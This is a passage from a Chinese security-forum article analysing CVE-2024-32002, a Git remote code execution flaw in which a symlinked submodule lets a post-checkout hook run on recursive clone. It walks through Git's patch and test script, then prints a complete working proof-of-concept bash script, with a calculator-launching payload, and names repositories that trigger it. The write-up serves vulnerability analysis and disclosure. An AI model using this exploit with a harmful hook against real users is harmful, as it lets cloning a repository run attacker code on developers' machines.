<p blockindex="39"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716169224934-aed75b5a-0c87-4a5f-9170-742e05111474.png" alt="" referrerpolicy="no-referrer" layer-index="5"></p>
<p blockindex="40">然后在执行克隆之前增加了一个检查，来确保目录是空的或者仅包含<code>.git</code>目录。如果不为空并且不仅仅包含<code>.git</code>目录，就会终止操作。</p>
<p blockindex="41"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716169327536-69a58881-25b5-4c4b-bca8-6e55b945dfe7.png" alt="" referrerpolicy="no-referrer" layer-index="6"></p>
<p blockindex="42">至于第二个文件，则是一个测试脚本，也就是我们来进行复现使用的关键信息都在里面，用于验证 Git 在处理包含符号链接的子模块路径时的行为。</p>
<p blockindex="43"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716169540205-bbe206b6-fb74-43fb-ac65-48f4d7a0e972.png" alt="" referrerpolicy="no-referrer" layer-index="7"></p>
<p blockindex="44">其中的关键代码为：</p>
<h3 blockindex="45">设置符号链接选项开启</h3>
<pre blockindex="46"><code class="hljs language-php">test_config_global protocol.file.allow always &amp;&amp;
test_config_global core.symlinks <span class="hljs-literal">true</span> &amp;&amp;
tell_tale_path=<span class="hljs-string">"<span class="hljs-subst">$PWD</span>/tell.tale"</span> &amp;&amp;
</code></pre>
<h3 blockindex="47">新建hook仓库（目录名为<code>hook</code>）</h3>
<pre blockindex="48"><code class="hljs language-php">tell_tale_path=<span class="hljs-string">"<span class="hljs-subst">$PWD</span>/tell.tale"</span> &amp;&amp;
git init hook &amp;&amp;
(
    cd hook &amp;&amp;
    mkdir -p y/hooks &amp;&amp;
    write_script y/hooks/post-checkout &lt;&lt;-EOF &amp;&amp;
    <span class="hljs-keyword">echo</span> HOOK-RUN &gt;&amp;<span class="hljs-number">2</span>
    <span class="hljs-keyword">echo</span> hook-run &gt;<span class="hljs-string">"<span class="hljs-subst">$tell_tale_path</span>"</span>
    EOF
    git add y/hooks/post-checkout &amp;&amp;
    test_tick &amp;&amp;
    git commit -m post-checkout
) &amp;&amp;
</code></pre>
<p blockindex="49">代码内容含义为：新建<code>hook/y/hooks/post-checkout</code>文件然后写入下面内容后提交：</p>
<pre blockindex="50"><code class="hljs language-php"><span class="hljs-keyword">echo</span> HOOK-RUN &gt;&amp;<span class="hljs-number">2</span>
<span class="hljs-keyword">echo</span> hook-run &gt;<span class="hljs-string">"<span class="hljs-subst">$tell_tale_path</span>"</span>
</code></pre>
<p blockindex="51">post-checkout 文件是什么？</p>
<p blockindex="52">post-checkout 是 Git 中的一种钩子（hook）。Git hooks 是一些脚本，允许你在特定的事件发生时执行自定义操作。post-checkout 钩子在以下情况之后被调用：</p>
<p blockindex="53">成功运行 git clone 命令。</p>
<p blockindex="54">成功运行 git checkout 命令。</p>
<h3 blockindex="55">新建captain仓库（最后git clone的仓库）</h3>
<pre blockindex="56"><code class="hljs language-php">hook_repo_path=<span class="hljs-string">"$(pwd)/hook"</span> &amp;&amp;
git init captain &amp;&amp;
(
    cd captain &amp;&amp;
    git submodule add --name x/y <span class="hljs-string">"<span class="hljs-subst">$hook_repo_path</span>"</span> A/modules/x &amp;&amp;
    test_tick &amp;&amp;
    git commit -m add-submodule &amp;&amp;
    printf .git &gt;dotgit.txt &amp;&amp;
    git hash-<span class="hljs-keyword">object</span> -w --stdin &lt;dotgit.txt &gt;dot-git.hash &amp;&amp;
    printf <span class="hljs-string">"120000 %s 0\ta\n"</span> <span class="hljs-string">"$(cat dot-git.hash)"</span> &gt;index.info &amp;&amp;
    git update-index --index-info &lt;index.info &amp;&amp;
    test_tick &amp;&amp;
    git commit -m add-symlink
) &amp;&amp;
</code></pre>
<p blockindex="57">添加子模块：</p>
<ul blockindex="58">
<li><code>hook_repo_path</code>设置上面hook仓库的路径，使用<code>git submodule add --name x/y "$hook_repo_path" A/modules/x</code>把hook仓库中的子模块添加到captain仓库中，子模块的名字是 <code>x/y</code>，路径是 <code>A/modules/x</code></li>
</ul>
<p blockindex="59">创建符号链接并提交：</p>
<ul blockindex="60">
<li>创建一个包含文本内容 ".git" 的文件 dotgit.txt。</li>
<li>计算 dotgit.txt 文件的哈希值，并将其存储到 Git 对象数据库中。</li>
<li>创建一个索引信息文件 index.info，其中包含创建一个符号链接（指向 .git 文件内容）的信息。</li>
<li>使用 git update-index 命令将符号链接的信息添加到 Git 索引中。</li>
<li>提交这个符号链接的添加。</li>
</ul>
<h3 blockindex="61">运行测试</h3>
<pre blockindex="62"><code class="hljs language-php">test_path_is_missing <span class="hljs-string">"<span class="hljs-subst">$tell_tale_path</span>"</span> &amp;&amp;
test_must_fail git <span class="hljs-keyword">clone</span> --recursive captain hooked <span class="hljs-number">2</span>&gt;err &amp;&amp;
grep <span class="hljs-string">"directory not empty"</span> err &amp;&amp;
test_path_is_missing <span class="hljs-string">"<span class="hljs-subst">$tell_tale_path</span>"</span>
</code></pre>
<p blockindex="63">这部分我们构造poc需要做的就是<code>git clone --recursive captain hooked 2&gt;err &amp;&amp;</code></p>
<h2 blockindex="64">构造POC</h2>
<p blockindex="65">经过上面的详细分析，如何构造poc也就一目了然了。当我尝试构造poc后，会出现报错：</p>
<pre blockindex="66"><code class="hljs language-php">$ git <span class="hljs-keyword">clone</span> --recursive git@github.com:<span class="hljs-number">10</span>cks/CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">32002</span>-submod.git test
Cloning into <span class="hljs-string">'test'</span>...
remote: Enumerating objects: <span class="hljs-number">8</span>, done.
remote: Counting objects: <span class="hljs-number">100</span>% (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>), done.
remote: Compressing objects: <span class="hljs-number">100</span>% (<span class="hljs-number">4</span>/<span class="hljs-number">4</span>), done.
remote: Total <span class="hljs-number">8</span> (delta <span class="hljs-number">1</span>), reused <span class="hljs-number">8</span> (delta <span class="hljs-number">1</span>), pack-reused <span class="hljs-number">0</span>
Receiving objects: <span class="hljs-number">100</span>% (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>), done.
Resolving deltas: <span class="hljs-number">100</span>% (<span class="hljs-number">1</span>/<span class="hljs-number">1</span>), done.
warning: the following paths have collided (e.g. <span class="hljs-keyword">case</span>-sensitive paths
on a <span class="hljs-keyword">case</span>-insensitive filesystem) <span class="hljs-keyword">and</span> only one <span class="hljs-keyword">from</span> the same
colliding group is in the working tree:

  <span class="hljs-string">'a'</span>
Submodule <span class="hljs-string">'x/y'</span> (git@github.com:<span class="hljs-number">10</span>cks/CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">32002</span>-hulk.git) registered <span class="hljs-keyword">for</span> path <span class="hljs-string">'A/modules/x'</span>
fatal: could not create leading directories of <span class="hljs-string">'D:/CVE-2024-32002/RCE/test/A/modules/x'</span>: Not a <span class="hljs-built_in">directory</span>
fatal: <span class="hljs-keyword">clone</span> of <span class="hljs-string">'git@github.com:10cks/CVE-2024-32002-hulk.git'</span> into submodule path <span class="hljs-string">'D:/CVE-2024-32002/RCE/test/A/modules/x'</span> failed
Failed to <span class="hljs-keyword">clone</span> <span class="hljs-string">'A/modules/x'</span>. Retry scheduled
fatal: could not create leading directories of <span class="hljs-string">'D:/CVE-2024-32002/RCE/test/A/modules/x'</span>: Not a <span class="hljs-built_in">directory</span>
fatal: <span class="hljs-keyword">clone</span> of <span class="hljs-string">'git@github.com:10cks/CVE-2024-32002-hulk.git'</span> into submodule path <span class="hljs-string">'D:/CVE-2024-32002/RCE/test/A/modules/x'</span> failed
Failed to <span class="hljs-keyword">clone</span> <span class="hljs-string">'A/modules/x'</span> a second time, aborting
</code></pre>
<p blockindex="67"><strong>通过邮件咨询，我才知道即使在windows上开启了符号链接选项，仍需以管理员权限运行才能够正确的执行符号链接。这也是为什么我花了两天时间一直没有在windows上成功实现任意代码执行的原因。</strong></p>
<p blockindex="68">除此之外，不能通过手动修改<code>.gitmodules</code>的方式来对子模块进行设置，会导致远程仓库无法正确进行递归。我们需要在生成<code>.gitmodules</code>前就对其进行修改，并且协议需要保持一致：</p>
<pre blockindex="69"><code class="hljs language-php">git submodule add --name x/y <span class="hljs-string">"远程子模块仓库"</span> A/modules/x
</code></pre>
<p blockindex="70">最后完整的poc在5月20号被Amal Murali放出，到这里关于git RCE的分析也就告一段段落了：</p>
<pre blockindex="71"><code class="hljs language-php"><span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment"># 设置 Git 配置选项</span>
git config --<span class="hljs-keyword">global</span> protocol.file.allow always
git config --<span class="hljs-keyword">global</span> core.symlinks <span class="hljs-literal">true</span>
<span class="hljs-comment"># 避免警告消息（设置默认分叉为main）</span>
git config --<span class="hljs-keyword">global</span> init.defaultBranch main 

<span class="hljs-comment"># 定义 tell-tale 路径</span>
tell_tale_path=<span class="hljs-string">"<span class="hljs-subst">$PWD</span>/tell.tale"</span>

<span class="hljs-comment"># 初始化 hook 仓库</span>
git init hook
cd hook
mkdir -p y/hooks

<span class="hljs-comment"># 将恶意代码写入 hook，适配windows环境与mac环境</span>
cat &gt; y/hooks/post-checkout &lt;&lt;EOF
<span class="hljs-comment">#!/bin/bash</span>
calc.exe
open -a Calculator.app
EOF

<span class="hljs-comment"># 使 hook 可执行：重要</span>
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m <span class="hljs-string">"post-checkout"</span>

cd ..

<span class="hljs-comment"># 定义 hook 仓库路径</span>
hook_repo_path=<span class="hljs-string">"$(pwd)/hook"</span>

<span class="hljs-comment"># 初始化 captain 仓库</span>
git init captain
cd captain
git submodule add --name x/y <span class="hljs-string">"<span class="hljs-subst">$hook_repo_path</span>"</span> A/modules/x
git commit -m <span class="hljs-string">"add-submodule"</span>

<span class="hljs-comment"># 创建符号链接</span>
printf <span class="hljs-string">".git"</span> &gt; dotgit.txt
git hash-<span class="hljs-keyword">object</span> -w --stdin &lt; dotgit.txt &gt; dot-git.hash
printf <span class="hljs-string">"120000 %s 0\ta\n"</span> <span class="hljs-string">"$(cat dot-git.hash)"</span> &gt; index.info
git update-index --index-info &lt; index.info
git commit -m <span class="hljs-string">"add-symlink"</span>
cd ..

<span class="hljs-comment"># 本地测试，传到github无需使用此功能</span>
git <span class="hljs-keyword">clone</span> --recursive captain hooked
</code></pre>
<p blockindex="72">运行<code>git clone --recursive git@github.com:10cks/captain.git GIT-RCE</code>后就可以RCE了：</p>
<p blockindex="73"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716176968660-815e292a-45d4-4d7f-8757-8af06bc9db69.png" alt="" referrerpolicy="no-referrer" layer-index="8"></p>
<p blockindex="74"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/attach-99189f941f9d4baa6a60cc2e1cc08ba257da03c3.gif" alt="tutieshi_640x360_4s_z.gif" referrerpolicy="no-referrer" layer-index="9"></p>
<h1 blockindex="75">参考链接</h1>
<p blockindex="76"><a href="https://twitter.com/amalmurali47/status/1791566569501573163">https://twitter.com/amalmurali47/status/1791566569501573163</a></p><!--1--></div></div>
                    </div>
                    <div class="post-opt mt-30">
                        <ul class="list-inline text-muted">
                            <li>
                                <i class="fa fa-clock-o"></i>
                                发表于 2024-05-20 20:11:28
                            </li>
                            <li>阅读 ( 2406 )</li>
                                                        <li>分类：<a href="https://forum.butian.net/community/Vul_analysis" target="_blank" rel="noopenner noreferrer">漏洞分析</a>
                                                        </li>
                                                                                    <li><a href="https://forum.butian.net/share/3040#" class="report_btn" data-source_type="article" data-source_id="3040" data-toggle="modal" data-target="#send_report_model"><i class="fa fa-flag-o"></i> 举报</a></li>
                                                    </ul>
                    </div>
                </div>
                <div class="text-center mt-30 mb-20">
                                            <button id="support-button" class="btn btn-success btn-lg mr-5" data-loading-text="加载中..." data-source_type="community" data-source_id="3040" data-support_num="5"> 5 推荐</button>
                                       
                                            <button id="collect-button" class="btn btn-default btn-lg" data-loading-text="加载中..." data-source_type="community" data-source_id="3040"> 收藏</button>
                                    </div>
                            </div>
            
            <div class="widget-answers mt-15">
                <h2 class="h4 post-title">2 条评论</h2>
                    <div class="comment">
                                                    <div class="media">
                                <div class="media-left">
                                    <a href="https://forum.butian.net/people/5543" class="avatar-link user-card " target="_blank" rel="noopenner noreferrer">
                                        <img class="avatar-40 hidden-xs" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/default_avatar.jpg" alt=""></a>
                                </div>
                                <div class="media-body">
                                    <div class="media-heading">
                                        <strong>
                                            <a href="https://forum.butian.net/people/5543" class="mr-5 user-card ">Pseudoknot</a>
                                        </strong>
                                        <span class="answer-time text-muted hidden-xs">1天前</span>
                                    </div>
                                    <div class="content">
                                        <div class="text-fmt mt-10 mb-10">不过节嘛</div>
                                    </div>
                                    <div class="media-footer">
                                        <ul class="list-inline mb-20">
                                            <li><a class="comments first-comment-reply" data-toggle="collapse" href="https://forum.butian.net/share/3040#comment-1909" data-source="1909" data-source_id="1909" data-to_user_id="5543" data-source_type="comment" data-message="回复 Pseudoknot" aria-expanded="true"><i class="fa fa-comment-o"></i> 1 条评论</a></li>
                                            <li class="pull-right">
                                                <button class="btn btn-default btn-sm btn-support " data-source_id="1909" data-source_type="comment" data-support_num="1"><i class="fa fa-thumbs-o-up "></i> 1</button>
                                            </li>
                                        </ul>
                                    </div>
                                    <!-- 二级评论 -->
                                    <div class="widget-comments collapse in" id="comment-1909" aria-expanded="true" style="">
                                        <div class="widget-comment-list mb-20">
                                                                                                                                                <div class="media">
                                                        <div class="media-left">
                                                            <a href="https://forum.butian.net/people/19511" class="avatar-link user-card " target="_blank" rel="noopenner noreferrer">
                                                                <img class="avatar-40 hidden-xs" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/b7d627de79f6261bb58ba319d9946eb8ef4ea9a.jpg" alt=""></a>
                                                        </div>
                                                        <div class="media-body">
                                                            <div class="media-heading">
                                                                    <a href="https://forum.butian.net/people/19511" class="mr-5 user-card ">10cks</a>
                                                                                                                                    <span>回复</span>
                                                                    <a href="https://forum.butian.net/people/5543" class="mr-5 user-card ">Pseudoknot</a>
                                                                                                                            </div>
                                                            <div class="content">
                                                                <div class="text-fmt mt-10 mb-10">哈哈哈</div>
                                                            </div>
                                                            <div class="media-footer">
                                                                <ul class="list-inline text-muted">
                                                                    <li>
                                                                    1天前
                                                                    </li>
                                                                    <li>
                                                                        <span class="ml-10 second-comment-reply" data-source="1909" data-source_id="1909" data-to_user_id="19511" data-source_type="comment" data-message="回复 10cks"><i class="fa fa-reply"></i> 回复</span>
                                                                    </li>
                                                                    <li class="pull-right">
                                                                        <button class="btn btn-default btn-xs btn-support " data-source_id="1913" data-source_type="comment" data-support_num="0"><i class="fa fa-thumbs-o-up"></i> 0</button>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                                                                
                                                                                                                                    </div>
                                        <!-- 二级评论框 -->
                                                                                    <div class="widget-comment-form row mt-20">
                                                <form class="col-md-12">
                                                    <div class="form-group">
                                                        <textarea name="content" placeholder="回复 Pseudoknot" class="form-control" id="second_comment-1909-textarea"></textarea>
                                                    </div>
                                                </form>
                                                <div class="col-md-12 text-right">
                                                    <button type="submit" class="btn btn-primary btn-sm ml-10 seconed-comment-btn" id="second_comment-1909-btn" data-token="oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT" data-source_id="1909" data-to_user_id="5543" data-source="1909" data-source_type="comment">提交评论</button>
                                                </div>
                                                <p id=""></p>
                                            </div>
                                                                            </div>
                                </div>
                            </div>
                                            </div>
                    <!-- 一级评论框 -->
                                            <div class="widget-comment-form row  mb-20">
                            <form class="col-md-12">
                                <div class="form-group">
                                    <textarea id="comment-content" name="content" placeholder="写下你的评论" class="form-control"></textarea>
                                </div>
                            </form>
                            <div class="col-md-12 text-right">
                                <!-- <a href="#" class="text-muted collapse-cancel">取消</a> -->
                                <button type="submit" data-token="oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT" data-source_id="3040" data-source_type="community" class="btn btn-primary btn-sm ml-10 comment-btn">提交评论</button>
                            </div>
                        </div>
                                        <!-- 分页 -->
                    <div class="text-center">
                        
                    </div>
            </div>

        </div>

        <div class="col-xs-12 col-md-3 side">
            <div class="widget-user ">
                <div class="media">
                    <a class="pull-left" href="https://forum.butian.net/people/19511"><img class="media-object avatar-64" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/b7d627de79f6261bb58ba319d9946eb8ef4ea9a.jpg" alt="10cks"></a>
                    <div class="media-body ">
                        <a href="https://forum.butian.net/people/19511" class="media-heading">10cks</a>
                                                <p class="text-muted">7 篇文章</p>
                    </div>
                </div>
            </div>
            <div class="hidden-xs">
                <div id="toc" class="bytemd-sidebar" style="width: 100%;"><div class="bytemd-toc"><h2>目录</h2><ul><li class="bytemd-toc-1 bytemd-toc-first bytemd-toc-active" style="padding-left:8px">前言</li><li class="bytemd-toc-1 bytemd-toc-first" style="padding-left:8px">初探</li><li class="bytemd-toc-1 bytemd-toc-first" style="padding-left:8px">深入理解</li><li class="bytemd-toc-2" style="padding-left:24px">补丁分析</li><li class="bytemd-toc-3" style="padding-left:40px">设置符号链接选项开启</li><li class="bytemd-toc-3" style="padding-left:40px">新建hook仓库（目录名为hook）</li><li class="bytemd-toc-3" style="padding-left:40px">新建captain仓库（最后git clone的仓库）</li><li class="bytemd-toc-3" style="padding-left:40px">运行测试</li><li class="bytemd-toc-2" style="padding-left:24px">构造POC</li><li class="bytemd-toc-1 bytemd-toc-first" style="padding-left:8px">参考链接</li></ul></div></div>
            </div>
        </div>
        <div class="mobile-toc-wrapper visible-xs">
            <div id="mobile-toc" class="toc-mobile" style="display: none;"></div>
            <button type="button" class="btn btn-default fixed-toc-button" aria-label="Left Align" style="display: none;">
                <span class="glyphicon glyphicon-align-left" aria-hidden="true"></span>
            </button>
        </div>

    </div>
    </div>
</div>



<footer id="footer">
    <div class="container">
                <div class="text-center">
            <a href="https://forum.butian.net/">奇安信攻防社区</a><span class="span-line">|</span>
            <a href="mailto:butian_report@qianxin.com" target="_blank" rel="noopenner noreferrer">联系我们</a><span class="span-line">|</span>
                        <a href="https://forum.butian.net/sitemap">sitemap</a>
        </div>
        <div class="copyright mt-10">
            Copyright © 2013-2023 BUTIAN.NET 版权所有 <a href="https://beian.miit.gov.cn/#/Integrated/index">京ICP备18014330号-2</a>
        </div>
    </div>
</footer>


<div class="modal fade" id="sendTo_message_model" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                <h4 class="modal-title" id="exampleModalLabel">发送私信</h4>
            </div>

                        <div class="modal-body">
                <form name="messageForm" id="sendTo_message_form">
                    <input type="hidden" name="_token" value="oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT">
                    <input type="hidden" id="to_user_id" name="to_user_id" value="0">
                    <div class="form-group">
                        <label for="to_user_name" class="control-label">发给:</label>
                        <span id="to_user_name"></span>
                    </div>
                    <div class="form-group">
                        <label for="message-text" class="control-label">内容:</label>
                        <textarea class="form-control" id="message-text" name="content"></textarea>
                    </div>

                    <div class="form-group ">
                        <input type="text" class="form-control" id="captcha" maxlength="32" name="captcha" autocomplete="off" required="" placeholder="请输入下方的验证码">
                        
                        <div style="margin-top: 10px;"><a href="javascript:void(0);" id="reloadCaptcha"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/default" alt="captcha"></a></div>
                    </div>

                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">取消</button>
                <button type="button" class="btn btn-primary" id="sendTo_submit">发送</button>
            </div>
                    </div>
    </div>
</div>


<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/jquery.min.js"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/bootstrap.min.js"></script>
<!-- jQuery (necessary for Twitter Bootstrap Hover Dropdown Plugin) -->
<script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/twitter-bootstrap-hover-dropdown.js"></script>
<script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/layer.js"></script>
<!-- 单点登录sso.js -->
<script type="text/javascript" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/sso.js"></script>
<script type="text/javascript">
    var is_login = Boolean("1");
    $(document).ready(async function(){
        var url = window.location.href;
        
        if ($("a.a_unLogin")) {
            var newUrl = "https://forum.butian.net/login" + "?redirectPath=" + url;
            $("a.a_unLogin").attr('href', newUrl);
        }
        if ($("a.a_unLogin_bt")) {
            var newUrl = "https://forum.butian.net/btlogin" + "?redirectPath=" + url;
            $("a.a_unLogin_bt").attr('href', newUrl);
        }

        if ($("a.a_unRegister")) {
            var newUrl = "https://forum.butian.net/register" + "?redirectPath=" + url;
            $("a.a_unRegister").attr('href', newUrl);
        }
    });
    const hostName = "https://user.skyeye.qianxin.com/".split('https://')[1];
    console.log(hostName,'hostName');
    const cookieName = 'btuc_ba52447ea424004a7da412b344e5e41a';
    function getCookie(name) {
        const strCookie = document.cookie
        const cookieList = strCookie.split(';')
        for(let i = 0; i < cookieList.length; i++) {
            const arr = cookieList[i].split('=');
            if (name === arr[0].trim()) {
                return arr[1]
            }
        }
        return '';
    }
    // 退出登录 移除 cookie
    $(document).on("click",".logout",async function() {
        var oDate = new Date();
        oDate.setDate(oDate.getDate()-1);//访问页面的前一天
        document.cookie =`${cookieName}=;SameSite=None;Secure=true;path=/;expires=${oDate.toGMTString()}`;
        const redirect = 'https://forum.butian.net/logout'
        await window.sessionModule.clearUCSessionID(hostName, $, redirect);
        location.href=redirect
    })
    window.onload = function () {
        // 获取sessionId,设置到cookie中
        async function getSessionId() {
            const hasCookie = getCookie(cookieName) !=='';
            // 若是当前第一次访问社区页面
            if(!hasCookie || (hasCookie && !is_login)) {
                let sessionId = await window.sessionModule.getUCSessionID(hostName, $);

                if(!sessionId) {
                    return
                }
           
                // 若登录了其他应用
                document.cookie =`${cookieName}=${sessionId};SameSite=None;Secure=true;path=/;domain=.butian.net`;
                // 单点登陆后第一次刷新页面，走到此处时页面已被渲染，故请求接口获取登陆信息
                await new Promise((resolve, reject) => {
                    $.ajax({
                        type: "GET",
                        url: '/ajax/cookieLogin',
                        success: function (res) {
                            const { data } = res;
                            if(data.code + '' === '1'){
                                $("#template").html(data.html);
                                resolve();
                            }else if(data.url){
                                location.href = data.url;
                            }
                        },
                    });
                })
            }
            
            /*通知异步加载*/
            $.ajax({
                type: "GET",
                url: "/ajax/unreadNotifications",
                success: function (data) {
                    $("#unread_notifications").html(data)
                },
                fail: function (error) {
                   console.log(error); 
                }
            })
        }
        getSessionId();
    }
</script>
<script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/global.js"></script>
<!-- 微信分享 -->
<script type="text/javascript" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/jweixin-1.6.0.js"></script>
<script type="text/javascript" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/qq-share.js"></script>
<script type="text/javascript" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/share.js"></script>
<script>
function GetUrlRelativePath() {
    var url = document.location.toString();
    var arrUrl = url.split("//");

  var start = arrUrl[1].indexOf("/");
    var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符

  if(relUrl.indexOf("?") != -1){
      relUrl = relUrl.split("?")[0];
    }
    return relUrl;
}

$(function(){
    if(GetUrlRelativePath().slice(0,9) !== "/article/" && GetUrlRelativePath().slice(0,7) !== "/share/" && GetUrlRelativePath().slice(0,10) !== "/question/") {
        initShare({
            APIs: ["updateAppMessageShareData", "updateTimelineShareData"],
            callback: {
              title: "奇安信攻防社区",
              imgUrl:
                "https://shs3.b.qianxin.com/butian_public/f8499623f20f6b5c90e8ca94ac7fc238acf39e36be2ef.jpg",
              description: "专注于网络安全技术分享，帮助安全从业者持续成长的专业社区！",
              url: window.location.href,
              successMethod: ""
            }
        });
    }

})
</script>
    <div class="modal fade" id="send_report_model" role="dialog" aria-labelledby="exampleModalLabel">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                <h4 class="modal-title" id="reportModalLabel">举报此文章</h4>
            </div>
            <div class="modal-body">
                <form name="reportForm" id="report_form" method="post" action="https://forum.butian.net/report">
                    <input type="hidden" name="_token" value="oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT">
                    <input type="hidden" name="source_type" value="">
                    <input type="hidden" name="source_id" value="">
                                            <div class="radio">
                            <label>
                                <input type="radio" name="report_type" class="reportRadioItem" value="1">
                                垃圾广告信息：
                                <span class="text-muted">广告、推广、测试等内容</span>
                            </label>
                        </div>
                                            <div class="radio">
                            <label>
                                <input type="radio" name="report_type" class="reportRadioItem" value="2">
                                违规内容：
                                <span class="text-muted">色情、暴力、血腥、敏感信息等内容</span>
                            </label>
                        </div>
                                            <div class="radio">
                            <label>
                                <input type="radio" name="report_type" class="reportRadioItem" value="3">
                                不友善内容：
                                <span class="text-muted">人身攻击、挑衅辱骂、恶意行为</span>
                            </label>
                        </div>
                                            <div class="radio">
                            <label>
                                <input type="radio" name="report_type" class="reportRadioItem" value="99">
                                其他原因：
                                <span class="text-muted">请补充说明</span>
                            </label>
                        </div>
                                        <div class="form-group" id="report_reason" style="display: none;">
                        <label for="message-text" class="control-label">举报原因:</label>
                        <textarea class="form-control" id="message-text" name="reason"></textarea>
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">取消</button>
                <button type="button" class="btn btn-primary" id="report_submit_button">举报</button>
            </div>
        </div>
    </div>
</div>           <div class="modal fade in" id="payment-qrcode-modal-article-3040" tabindex="-1" role="" aria-labelledby="exampleModalLabel" aria-hidden="false">
    <div class="modal-dialog">
        <div class="modal-content">

            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                <h4 class="modal-title text-center" id="exampleModalLabel">
                    <img class="avatar-64" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/b7d627de79f6261bb58ba319d9946eb8ef4ea9a.jpg" alt="10cks">
                </h4>
            </div>

            <div class="modal-body text-center">
                <p class="text-md">如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！</p>
                <img class="payment-qrcode" src="https://forum.butian.net/share/3040" alt="" style="height:300px"><hr>
            </div>

        </div>
    </div>
</div>        <script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/geetest.js"></script>
    <script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/editor-butian-forum.min.js"></script>
    <script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/untils.js"></script><div style="display:none;position:fixed;top:40%;left:50%;z-index:9999;transform: translate(-50%, -50%);padding: 3px 15px;border-radius:8px;background: rgba(120, 120, 120, 0.7);box-shadow: 1px 1px 3px 1px rgba(160, 160, 160, 0.6);text-align:center;font-size:12px;color:#fff;"></div><div id="windowLoading" class="modal fade" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="loading text-center text-warning">
                        <i class="fa fa-spinner fa-spin fa-2x" aria-hidden="true"></i>
                        <br>
                        <span class="text">加载中</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/preview-img.js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            $('.fixed-toc-button').click(function(){
                $(window.innerWidth > 1199 ? '#toc' : '#mobile-toc').toggle()
            })
            var article_id = "3040";
            var url = window.location.href;
            /*评论默认展开*/
            // load_comments('community',article_id);
            // $("#comments-community-"+article_id).collapse('show');
            /* 初始化文章详情 */
            var viewerObj = butianForumEditor.tocViewer({
                target: document.querySelector("#md_view"),
                tocTarget: document.querySelector(window.innerWidth > 1199 ? '#toc' : '#mobile-toc'),
                props: {
                    value: $("#md_view_content").text(),
                },
            });
            layer.photos({
                photos: '#layer-photos-demo', // 图片预览容器
                zIndex: 99999999, // 弹出层级
                shade: 0.5,//遮罩层
                shift: 5, //0-6的选择，指定弹出图片动画类型，默认随机      
                closeBtn:2,
                success: function(layero, index) {
                    var image = $(".layui-layer-phimg").parent();
                    var h = image.height();
                    var w = image.width();
                    let innerWidth=window.innerWidth-60
                    let innerHeight=window.innerHeight-60
                    var ratioHeight = (innerHeight / h).toFixed(2);
                    var ratioWidth = (innerWidth / w).toFixed(2);
                    var minRatio = Math.min(ratioHeight, ratioWidth);
                    zoomImage(image, minRatio);
                }
				//添加按钮---后续优化
				// tab: function () {
				// 	$(".layui-layer-content").append(`<div class="pootosIcon" style="position:absolute;width:100%;text-align:center;bottom:0px;cursor:pointer;"><i id="zoomInButton" class="glyphicon glyphicon-zoom-in"></i><i id="zoomOutButton" class="glyphicon glyphicon-zoom-out"></i></div>`);
				// },
            });
            $('#mobile-toc').addClass('toc-mobile')
            $('.mobile-toc-wrapper .bytemd-toc ul').click(function(){
